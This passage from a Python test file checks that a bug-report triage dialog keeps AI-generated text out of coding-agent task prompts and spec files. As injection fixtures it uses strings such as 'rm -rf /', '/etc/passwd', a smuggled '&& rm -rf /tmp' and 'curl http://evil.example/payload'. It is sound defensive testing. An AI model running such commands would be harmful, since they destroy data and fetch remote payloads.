        confirm.window.destroy()  # simulates a parent's destroy() cascading to this Toplevel
        self.assertTrue(confirm._closed)


class CreateAndStartAiOutputBoundaryTests(ReportSpecDialogCase):
    """C19 boundary test (review fix, iteration 2): path-like, command-like, newline-including
    strings set directly on TriageResult's own evidence/suspected_locations/criteria_draft/
    reply_draft fields, carried through the *real* pipeline -- reports_create_and_start.
    ai_suggested_criteria, this dialog's confirm screen, a human pressing 作成して開始, and the
    real reports_create_and_start.create_and_start (only resolve_repo_dir/create_spec_file/
    start_run swapped for a tempdir and a fake Orchestrator entry point) -- never a
    create_and_start_fn fake that merely records its own arguments without exercising C19's own
    isolation logic."""

    def test_ai_output_is_isolated_through_the_real_create_and_start_path(self):
        evidence = "危険な根拠1行目\n危険な根拠2行目: /etc/passwd; rm -rf /"
        reply_draft = "返信草案\ncurl http://evil.example/payload"
        criteria_draft = ("条件: 不具合が起きない", "条件: パス C:\\evil\\path; rm -rf /")
        suspected_locations = ("foo.py:10 && rm -rf /tmp",)
        result = triage.TriageResult(
            classification="bug", confidence="high", evidence=evidence,
            suspected_locations=suspected_locations, criteria_draft=criteria_draft,
            reply_draft=reply_draft)
        outcome = triage.TriageOutcome(result, "", True)

        with tempfile.TemporaryDirectory() as tmp:
            specs_dir = Path(tmp) / "specs"
            repo_dir = Path(tmp) / "repos" / "next-day-setup"
            start_calls = []
            seen_app_keys = []

            def fake_resolve_repo_dir(app_key):
                seen_app_keys.append(app_key)
                return repo_dir

            def fake_start_run(**kwargs):
                start_calls.append(kwargs)
                return Path(tmp) / "run-dir"

            def real_create_and_start_fn(report, criteria, *, main_agent, review_agent):
                return cas.create_and_start(
                    report, criteria, main_agent=main_agent, review_agent=review_agent,
                    resolve_repo_dir=fake_resolve_repo_dir,
                    create_spec_file=lambda lines, target_repo, identity: inbox.create_spec_file(
                        lines, target_repo, identity, specs_dir=specs_dir),
                    start_run=fake_start_run)

            report = make_report(body="報告本文マーカーQQQ")
            d = self.make_dialog(
                report=report, investigate_fn=lambda r, *, stop_event: outcome,
                create_and_start_fn=real_create_and_start_fn,
                current_roles=lambda: ("claude", "codex"),
                resolve_repo_dir_for_confirm=fake_resolve_repo_dir)
            d._investigation_thread.join(timeout=5)
            d._tick()

            d._on_create_and_start()
            confirm = d._confirm_dialog
            confirm._on_start()
            confirm._start_thread.join(timeout=5)
            confirm._tick()

            self.assertFalse(confirm.exists())  # success closes the confirmation dialog
            self.assertFalse(d.window.winfo_exists())  # and the parent dialog

            # repo is decided only from the registry stub, keyed by app_key alone (C19) -- called
            # once for the confirmation dialog's own display and once inside create_and_start.
            self.assertEqual(seen_app_keys, ["next-day-setup"] * len(seen_app_keys))
            self.assertTrue(seen_app_keys)
            self.assertEqual(len(start_calls), 1)
            call = start_calls[0]
            self.assertEqual(call["repo"], str(repo_dir))
            self.assertEqual(call["main_agent"], "claude")
            self.assertEqual(call["review_agent"], "codex")

            # the task text is the fixed template + kind label only -- never the AI output or the
            # report body, even though evidence/reply_draft/suspected_locations are path-like,
            # command-like and contain embedded newlines.
            task_text = call["task"]
            self.assertNotIn("rm -rf", task_text)
            self.assertNotIn("curl", task_text)
            self.assertNotIn("/etc/passwd", task_text)
            self.assertNotIn(evidence, task_text)
            self.assertNotIn(reply_draft, task_text)
            self.assertNotIn("報告本文マーカーQQQ", task_text)
            self.assertIn("DCC報告対応", task_text)

            spec_files = list(specs_dir.glob("*.json"))
            self.assertEqual(len(spec_files), 1)
            spec_text = spec_files[0].read_text(encoding="utf-8")
            loaded_criteria = [c["text"] for c in inbox.taskspec.load_spec_file(spec_files[0]).criteria]
            # the AI-suggested criteria the human left in place are the *only* place this
            # candidate text may land, and only as acceptance-criteria lines (never executed,
            # never a path/command the spec-loader itself interprets).
            self.assertIn("条件: パス C:\\evil\\path; rm -rf /", loaded_criteria)
            self.assertIn("修正箇所の候補: foo.py:10 && rm -rf /tmp", loaded_criteria)
            # evidence and reply_draft must never reach the spec file at all (C2/C19).
            self.assertNotIn(evidence, spec_text)
            self.assertNotIn("危険な根拠", spec_text)
            self.assertNotIn(reply_draft, spec_text)
            self.assertNotIn("curl", spec_text)
            self.assertNotIn("報告本文マーカーQQQ", spec_text)


if __name__ == "__main__":
    unittest.main()
